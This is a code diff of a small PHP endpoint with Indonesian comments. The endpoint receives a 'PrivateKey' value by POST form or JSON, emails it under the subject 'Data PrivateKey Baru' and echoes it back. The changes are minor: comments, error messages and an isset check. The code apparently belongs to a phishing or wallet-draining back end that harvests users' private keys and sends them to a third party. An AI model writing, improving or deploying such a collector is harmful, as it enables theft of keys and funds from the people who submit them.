@@ -8,16 +8,16 @@ header("Content-Type: application/json");
 
 // Periksa apakah request menggunakan POST
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    $PrivateKey = "";
+    $PrivateKey = null;
 
-    // Cek apakah data dikirim melalui form (x-www-form-urlencoded)
+    // Cek apakah data dikirim dari FORM (x-www-form-urlencoded)
     if (!empty($_POST["PrivateKey"])) {
         $PrivateKey = trim($_POST["PrivateKey"]);
     }
 
-    // Cek apakah data dikirim sebagai JSON
+    // Cek apakah data dikirim dalam format JSON
     $json_data = json_decode(file_get_contents("php://input"), true);
-    if (!empty($json_data['PrivateKey'])) {
+    if (isset($json_data['PrivateKey'])) {
         $PrivateKey = trim($json_data['PrivateKey']);
     }
 
@@ -40,10 +40,10 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         $subject = "Data PrivateKey Baru";
         kirim_email($subject, $data);
 
-        // Respon JSON
+        // Respon JSON sukses
         echo json_encode(["message" => "Metode POST berhasil diterima!", "data_received" => $PrivateKey]);
     } else {
-        echo json_encode(["error" => "Data PrivateKey tidak ditemukan!"]);
+        echo json_encode(["error" => "PrivateKey tidak ditemukan!"]);
     }
 } else {
     echo json_encode(["error" => "Gunakan metode POST."]);
